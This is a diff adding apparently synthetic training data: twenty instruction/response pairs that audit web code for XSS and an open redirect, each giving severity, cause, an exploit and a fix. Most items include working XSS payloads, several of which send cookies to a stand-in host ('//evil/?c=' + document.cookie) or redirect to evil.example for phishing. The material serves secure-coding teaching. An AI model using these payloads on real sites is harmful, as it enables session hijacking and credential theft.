@@ -1,0 +1,82 @@
+[
+  {
+    "instruction": "Audit this code for security issues:\n\ndef hello(request):\n    name = request.GET.get('name', '')\n    return HttpResponse('<h1>Hello ' + name + '</h1>')",
+    "output": "**Vulnerability:** Reflected XSS\n**Severity:** High\n**Why:** Untrusted `name` is written into HTML without escaping.\n**Exploit:** `?name=<script>fetch('//evil/?c='+document.cookie)</script>`.\n**Fix:**\nfrom django.utils.html import escape\nreturn HttpResponse('<h1>Hello ' + escape(name) + '</h1>')"
+  },
+  {
+    "instruction": "Audit this code for security issues (React):\n\nfunction Comment({ text }) {\n  return <div dangerouslySetInnerHTML={{ __html: text }} />;\n}",
+    "output": "**Vulnerability:** Stored/reflected XSS\n**Severity:** High\n**Why:** `dangerouslySetInnerHTML` injects raw HTML with no sanitization.\n**Exploit:** A comment containing `<img src=x onerror=alert(document.cookie)>` executes for every viewer.\n**Fix:**\n// Render as text:\nreturn <div>{text}</div>;\n// Or sanitize first: import DOMPurify; <div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(text)}} />"
+  },
+  {
+    "instruction": "Audit this code for security issues (JS):\n\nconst q = new URLSearchParams(location.search).get('q');\ndocument.getElementById('out').innerHTML = 'Results for ' + q;",
+    "output": "**Vulnerability:** DOM-based XSS\n**Severity:** High\n**Why:** `innerHTML` parses the value as HTML.\n**Exploit:** `?q=<img src=x onerror=alert(1)>`.\n**Fix:**\ndocument.getElementById('out').textContent = 'Results for ' + q;"
+  },
+  {
+    "instruction": "Audit this code for security issues:\n\nurl = request.GET['next']\nreturn redirect(url)",
+    "output": "**Vulnerability:** Open redirect (often chained with XSS/phishing)\n**Severity:** Medium\n**Why:** `next` is used unvalidated; can point to an attacker domain.\n**Exploit:** `?next=https://evil.example/login` to phish credentials.\n**Fix:**\nfrom urllib.parse import urlparse\nif urlparse(url).netloc:\n    url = '/'  # only allow relative redirects\nreturn redirect(url)"
+  },
+  {
+    "instruction": "Audit this code for security issues (template):\n\n<div>Welcome, {{ user_bio | safe }}</div>",
+    "output": "**Vulnerability:** XSS via `|safe`\n**Severity:** High\n**Why:** The `safe` filter disables auto-escaping, so any HTML in `user_bio` renders.\n**Exploit:** A bio of `<script>...</script>` or an `onerror` image executes.\n**Fix:**\n<div>Welcome, {{ user_bio }}</div>\n{# or sanitize to an allow-list of tags if formatting is required #}"
+  },
+  {
+    "instruction": "Audit this code for security issues (PHP):\n\necho \"<p>Search: \" . $_GET['q'] . \"</p>\";",
+    "output": "**Vulnerability:** Reflected XSS\n**Severity:** High\n**Why:** `$_GET['q']` is echoed without `htmlspecialchars`.\n**Exploit:** `?q=<script>document.location='//evil/?c='+document.cookie</script>`.\n**Fix:**\necho \"<p>Search: \" . htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8') . \"</p>\";"
+  },
+  {
+    "instruction": "Audit this code for security issues (JS):\n\nconst user = JSON.parse(localStorage.user);\nel.innerHTML = `<a href='${user.homepage}'>Home</a>`;",
+    "output": "**Vulnerability:** DOM XSS / attribute injection\n**Severity:** High\n**Why:** Untrusted `homepage` is interpolated into an HTML attribute.\n**Exploit:** `homepage = \"javascript:alert(1)\"` or `'><img src=x onerror=...>`.\n**Fix:**\nconst a = document.createElement('a');\na.href = /^https?:/.test(user.homepage) ? user.homepage : '#';\na.textContent = 'Home';\nel.appendChild(a);"
+  },
+  {
+    "instruction": "Audit this code for security issues (Jinja2):\n\n<p>{{ comment }}</p>\n<script>\n  var c = \"{{ comment }}\";\n</script>",
+    "output": "**Vulnerability:** XSS in a JavaScript context\n**Severity:** High\n**Why:** HTML escaping is wrong for a JS string context; a quote breaks out of the string.\n**Exploit:** `comment = \"\"; alert(document.cookie);//`.\n**Fix:**\n<script>\n  var c = {{ comment | tojson }};\n</script>"
+  },
+  {
+    "instruction": "Audit this code for security issues:\n\nreturn f'<img src=\"{request.args[\"url\"]}\">'",
+    "output": "**Vulnerability:** XSS via attribute injection\n**Severity:** High\n**Why:** The URL is placed in a double-quoted attribute without escaping.\n**Exploit:** `?url=x\" onerror=\"alert(1)`.\n**Fix:**\nfrom markupsafe import escape\nreturn f'<img src=\"{escape(request.args[\"url\"])}\">'"
+  },
+  {
+    "instruction": "Audit this code for security issues (VB/ASP.NET):\n\nLabel1.Text = Request.QueryString(\"name\")\nResponse.Write(\"<b>\" & Request.QueryString(\"msg\") & \"</b>\")",
+    "output": "**Vulnerability:** Reflected XSS\n**Severity:** High\n**Why:** `Request.QueryString` values are written to the response unencoded.\n**Exploit:** `?msg=<script>alert(1)</script>`.\n**Fix:**\nResponse.Write(\"<b>\" & HttpUtility.HtmlEncode(Request.QueryString(\"msg\")) & \"</b>\")"
+  },
+  {
+    "instruction": "Audit this code for security issues (JS):\n\napp.get('/profile', (req, res) => {\n  res.send('<h1>' + req.query.name + '</h1>');\n});",
+    "output": "**Vulnerability:** Reflected XSS\n**Severity:** High\n**Why:** `req.query.name` is emitted as HTML.\n**Exploit:** `?name=<script>alert(1)</script>`.\n**Fix:**\nconst escapeHtml = require('escape-html');\nres.send('<h1>' + escapeHtml(req.query.name) + '</h1>');"
+  },
+  {
+    "instruction": "Audit this code for security issues (template literal):\n\nconst html = `<div class=\"${cls}\">${content}</div>`;\nbox.innerHTML = html;",
+    "output": "**Vulnerability:** DOM XSS\n**Severity:** High\n**Why:** `innerHTML` parses both `cls` and `content` as markup.\n**Exploit:** `content = '<svg onload=alert(1)>'`.\n**Fix:**\nbox.textContent = content;\n// set cls safely: box.className = allowedCls;"
+  },
+  {
+    "instruction": "Audit this code for security issues (AngularJS):\n\n<div ng-bind-html=\"userHtml\"></div>",
+    "output": "**Vulnerability:** XSS via unsafe HTML binding\n**Severity:** High\n**Why:** `ng-bind-html` renders HTML; without sanitization it can execute scripts/handlers.\n**Exploit:** `userHtml = '<iframe src=javascript:alert(1)>'`.\n**Fix:**\n// Use $sce with a trusted value only after sanitizing:\n<div ng-bind-html=\"userHtml | sanitize\"></div>\n// Or bind as text with ng-bind (auto-escaped)."
+  },
+  {
+    "instruction": "Audit this code for security issues (Jinja2 autoescape off):\n\nenv = Environment(autoescape=False)\ntpl = env.from_string('<p>{{ bio }}</p>')",
+    "output": "**Vulnerability:** XSS (autoescaping disabled)\n**Severity:** High\n**Why:** With `autoescape=False`, template variables are inserted raw.\n**Exploit:** Any user-supplied `bio` containing HTML/JS executes.\n**Fix:**\nenv = Environment(autoescape=True)  # or use select_autoescape(['html', 'xml'])"
+  },
+  {
+    "instruction": "Audit this code for security issues (JS):\n\nconst params = new URLSearchParams(location.hash.slice(1));\neval(params.get('cb'));",
+    "output": "**Vulnerability:** XSS via eval of attacker input\n**Severity:** Critical\n**Why:** Data from the URL fragment is executed by `eval`.\n**Exploit:** `#cb=alert(document.cookie)` executes arbitrary JS.\n**Fix:**\n// Never eval untrusted input. Dispatch on a fixed allow-list:\nconst actions = { ping: () => postMessage('pong') };\nconst name = new URLSearchParams(location.hash.slice(1)).get('cb');\nif (Object.prototype.hasOwnProperty.call(actions, name)) actions[name]();"
+  },
+  {
+    "instruction": "Audit this code for security issues (Pug/Jade):\n\np!= userContent",
+    "output": "**Vulnerability:** XSS via unescaped output\n**Severity:** High\n**Why:** `!=` in Pug emits unescaped (buffered) HTML, unlike `=`.\n**Exploit:** `userContent = '<script>alert(1)</script>'`.\n**Fix:**\np= userContent"
+  },
+  {
+    "instruction": "Audit this code for security issues (SVG upload):\n\n@app.route('/upload', methods=['POST'])\ndef upload():\n    f = request.files['img']\n    f.save('static/uploads/' + f.filename)\n    return f'<img src=\"/static/uploads/{f.filename}\">'",
+    "output": "**Vulnerability:** Stored XSS via SVG upload\n**Severity:** High\n**Why:** SVGs can embed `<script>`; serving them from the same origin executes on view. `f.filename` is also unsanitized.\n**Exploit:** Upload `x.svg` with `<script>fetch('//evil?c='+document.cookie)</script>`.\n**Fix:**\nUse werkzeug.utils.secure_filename, restrict to raster types, and serve uploads from a separate origin/CDN with Content-Disposition and a strict CSP."
+  },
+  {
+    "instruction": "Audit this code for security issues (response header):\n\nresp = make_response(page)\nresp.headers['X-XSS-Protection'] = '0'",
+    "output": "**Vulnerability:** Weak XSS defense (misconfiguration)\n**Severity:** Medium\n**Why:** Setting `X-XSS-Protection: 0` disables the browser's legacy filter and provides no real protection; it does not make input safe.\n**Fix:**\n# Don't rely on this header. Escape output and add a CSP:\nresp.headers['Content-Security-Policy'] = \"default-src 'self'; script-src 'self'\""
+  },
+  {
+    "instruction": "Audit this code for security issues (JS markdown):\n\nconst html = marked(userMarkdown);\nelement.innerHTML = html;",
+    "output": "**Vulnerability:** XSS via unsanitized Markdown\n**Severity:** High\n**Why:** Many Markdown parsers pass raw HTML through, so embedded `<script>`/`onerror` survives.\n**Exploit:** Markdown containing `<img src=x onerror=alert(1)>`.\n**Fix:**\nimport DOMPurify from 'dompurify';\nelement.innerHTML = DOMPurify.sanitize(marked(userMarkdown));"
+  },
+  {
+    "instruction": "Audit this code for security issues (JS):\n\nconst name = req.query.name;\nres.send('<p>Hi ' + name + '</p>');",
+    "output": "**Vulnerability:** Reflected XSS\n**Severity:** High\n**Why:** `req.query.name` is concatenated into an HTML response.\n**Exploit:** `?name=<script>alert(document.cookie)</script>`.\n**Fix:**\nconst escapeHtml = require('escape-html');\nres.send('<p>Hi ' + escapeHtml(name) + '</p>');"
+  }
+]
